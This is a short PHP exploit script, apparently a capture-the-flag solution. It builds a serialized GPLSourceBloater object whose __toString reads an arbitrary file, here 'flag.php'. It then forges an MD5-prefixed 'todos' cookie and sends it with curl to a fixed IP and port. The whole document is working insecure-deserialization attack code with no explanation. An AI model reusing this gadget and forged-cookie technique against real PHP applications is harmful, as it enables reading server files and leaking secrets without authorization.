<?php
Class GPLSourceBloater{
    public function __toString()
    {
        return highlight_file('license.txt', true).highlight_file($this->source, true);
    }
}

$objects = [ new GPLSourceBloater() ];
$objects[0]->source = 'flag.php';

$m = serialize($objects);
$h = md5($m);

$cookie = urlencode($h . $m);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'http://104.154.70.126:10888/');
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Cookie: todos=' . $cookie));
curl_exec($ch);

curl_close($ch);